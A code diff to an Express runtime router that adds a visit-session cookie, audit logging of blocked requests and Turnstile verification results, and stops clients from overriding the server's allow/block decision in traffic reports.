@@ -1,5 +1,5 @@
 import { Router } from "express";
-import { timingSafeEqual } from "node:crypto";
+import { randomUUID, timingSafeEqual } from "node:crypto";
 import {
   deliverSessionCommand,
   findPackage,
@@ -145,6 +145,29 @@ function validSessionId(value = "") {
   return /^[a-z0-9_.:-]{0,96}$/i.test(String(value || ""));
 }
 
+function runtimeSessionId(req) {
+  const cookieValue = String(req.headers?.cookie || "")
+    .split(";")
+    .map((item) => item.trim())
+    .find((item) => item.startsWith("deuce_visit="))
+    ?.slice("deuce_visit=".length) || "";
+  const value = String(req.body?.sessionId || req.query?.sessionId || req.deuceVisitSessionId || cookieValue || "").trim();
+  return value && validSessionId(value) ? value : "";
+}
+
+function ensureRuntimeVisitSession(req, res) {
+  const existing = runtimeSessionId(req);
+  if (existing) {
+    req.deuceVisitSessionId = existing;
+    return existing;
+  }
+  const sessionId = `sess_${randomUUID().replace(/-/g, "").slice(0, 24)}`;
+  req.deuceVisitSessionId = sessionId;
+  const secure = req.secure || String(req.headers["x-forwarded-proto"] || "").toLowerCase() === "https" || process.env.NODE_ENV === "production";
+  res.append("Set-Cookie", `deuce_visit=${sessionId}; Path=/api; HttpOnly; SameSite=Strict; Max-Age=1800${secure ? "; Secure" : ""}`);
+  return sessionId;
+}
+
 function relaySecretFor(page) {
   return page?.hostingConfig?.relaySecret
     || page?.hostingConfig?.cloudflareRelaySecret
@@ -157,6 +180,32 @@ function allowedHostsFor(page) {
     page?.domain,
     page?.hostingConfig?.domain
   ].map(normalizeHost).filter(Boolean)));
+}
+
+async function recordRuntimeBlock(page, req, details = {}) {
+  if (!page?.id) return;
+  try {
+    await saveTrafficEvent({
+      userPageId: page.id,
+      pageId: page.slug,
+      sessionId: runtimeSessionId(req),
+      event: details.event || "security_denied",
+      screen: String(req.body?.screen || req.query?.file || "").slice(0, 160) || null,
+      hostname: details.hostname || normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host),
+      path: req.path,
+      result: "blocked",
+      reason: details.reason || "Runtime access denied",
+      metadata: {
+        decisionSource: details.decisionSource || "runtime_context",
+        deviceType: details.decision?.deviceType || null,
+        proxyType: details.decision?.proxyType || null,
+        reputation: details.decision?.reputation || null,
+        reputationStatus: details.decision?.reputationStatus || null
+      }
+    }, trustedRelayClientIp(req), req.headers["user-agent"]);
+  } catch (error) {
+    console.warn("Runtime block logging failed", { code: error?.code || "TRAFFIC_WRITE_FAILED" });
+  }
 }
 
 function publicPageConfig(page, decision = null) {
@@ -209,10 +258,12 @@ async function runtimeContext(req, res, options = {}) {
   if (!page) {
     return runtimeError(res, 404, "Runtime page not found");
   }
+  ensureRuntimeVisitSession(req, res);
 
   const expectedSecret = relaySecretFor(page);
   const providedSecret = req.headers["x-deuce-relay-secret"] || req.body?.relaySecret;
   if (expectedSecret && !safeCompare(providedSecret, expectedSecret)) {
+    await recordRuntimeBlock(page, req, { reason: "Relay authentication failed" });
     return accessDenied(res);
   }
   req.deuceRelayTrusted = Boolean(expectedSecret);
@@ -220,14 +271,17 @@ async function runtimeContext(req, res, options = {}) {
   const clientHost = normalizeHost(req.headers["x-deuce-client-host"] || req.body?.hostname || req.query?.hostname || req.headers.origin || req.headers.host);
   const allowedHosts = allowedHostsFor(page);
   if (allowedHosts.length && !clientHost) {
+    await recordRuntimeBlock(page, req, { reason: "Client domain was missing" });
     return accessDenied(res);
   }
   if (allowedHosts.length && clientHost && !allowedHosts.includes(clientHost)) {
+    await recordRuntimeBlock(page, req, { hostname: clientHost, reason: "Client domain was not authorized" });
     return accessDenied(res);
   }
 
   const subscriptionState = pageSubscriptionState(page);
   if (subscriptionState.blocked) {
+    await recordRuntimeBlock(page, req, { hostname: clientHost, reason: "Page subscription is not active" });
     return pageExpired(res, 402, options.expiredResponse === "html" ? { html: true } : {});
   }
 
@@ -237,6 +291,12 @@ async function runtimeContext(req, res, options = {}) {
 async function enforceRuntimeSecurity(context, req, res) {
   const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (decision.allowed) return decision;
+  await recordRuntimeBlock(context.page, req, {
+    hostname: context.clientHost,
+    reason: decision.reason,
+    decisionSource: "server_security",
+    decision
+  });
   accessDenied(res);
   return null;
 }
@@ -251,10 +311,16 @@ function validSourceProof(context, req) {
   });
 }
 
-function enforceSourceProof(context, decision, req, res) {
+async function enforceSourceProof(context, decision, req, res) {
   if (!sourceProofRequired(context, decision)) return true;
   if (validSourceProof(context, req)) return true;
   if (readSourceProofCookie(req)) clearSourceProofCookie(res);
+  await recordRuntimeBlock(context.page, req, {
+    event: "source_proof_denied",
+    hostname: context.clientHost,
+    reason: "Human verification proof was missing or invalid",
+    decisionSource: "source_proof"
+  });
   accessDenied(res);
   return false;
 }
@@ -758,7 +824,7 @@ async function sendRuntimePackageFile(req, res, { asAsset = false } = {}) {
   if (!context) return;
   const securityDecisionResult = await enforceRuntimeSecurity(context, req, res);
   if (!securityDecisionResult) return;
-  if (!enforceSourceProof(context, securityDecisionResult, req, res)) return;
+  if (!await enforceSourceProof(context, securityDecisionResult, req, res)) return;
 
   const pagePackage = await packageForRuntimePage(context.page);
   const requestedFile = String(req.query?.file || "");
@@ -871,6 +937,12 @@ runtimeRouter.post("/security/check", async (req, res) => {
   if (!context) return;
   const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (!decision.allowed) {
+    await recordRuntimeBlock(context.page, req, {
+      hostname: context.clientHost,
+      reason: decision.reason,
+      decisionSource: "server_security",
+      decision
+    });
     res.status(403).json({ allowed: false, reason: accessDeniedMessage });
     return;
   }
@@ -883,6 +955,12 @@ runtimeRouter.post("/verify-human", async (req, res) => {
   if (!context) return;
   const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
   if (!decision.allowed) {
+    await recordRuntimeBlock(context.page, req, {
+      hostname: context.clientHost,
+      reason: decision.reason,
+      decisionSource: "server_security",
+      decision
+    });
     res.status(403).json({ verified: false, reason: accessDeniedMessage });
     return;
   }
@@ -899,10 +977,28 @@ runtimeRouter.post("/verify-human", async (req, res) => {
     remoteIp: context.ip
   });
   if (result.success) {
+    await saveTrafficEvent({
+      userPageId: context.page.id,
+      pageId: context.page.slug,
+      sessionId: runtimeSessionId(req),
+      event: "turnstile_verified",
+      hostname: context.clientHost,
+      path: req.path,
+      result: "allowed",
+      reason: "Turnstile passed",
+      metadata: { decisionSource: "turnstile" }
+    }, context.ip, req.headers["user-agent"]);
     setSourceProofCookie(res, createSourceChallengeProof({
       userPageId: context.page.id,
       ip: context.ip
     }));
+  } else {
+    await recordRuntimeBlock(context.page, req, {
+      event: "turnstile_verify_failed",
+      hostname: context.clientHost,
+      reason: "Turnstile verification failed",
+      decisionSource: "turnstile"
+    });
   }
   res.status(result.success ? 200 : 400).json({
     verified: result.success,
@@ -916,16 +1012,18 @@ runtimeRouter.post("/traffic", async (req, res) => {
   const context = await runtimeContext(req, res);
   if (!context) return;
   const decision = await securityDecision(context.page, context.ip, req.headers["user-agent"], req);
+  const runtimeReportedBlock = decision.allowed && String(req.body?.result || "").toLowerCase() === "blocked";
   const event = await saveTrafficEvent({
     ...req.body,
     userPageId: context.page.id,
     pageId: context.page.slug,
     hostname: context.clientHost || req.body?.hostname,
-    result: req.body?.result || (decision.allowed ? "allowed" : "blocked"),
-    reason: req.body?.reason || decision.reason,
+    result: decision.allowed && !runtimeReportedBlock ? "allowed" : "blocked",
+    reason: decision.allowed ? (req.body?.reason || decision.reason) : decision.reason,
     metadata: {
       ...(req.body?.metadata || {}),
       screenFile: String(req.body?.screenFile || ""),
+      decisionSource: decision.allowed ? (runtimeReportedBlock ? "runtime_client" : null) : "server_security",
       deviceType: decision.deviceType || null,
       proxyType: decision.proxyType || null,
       reputation: decision.reputation || null,
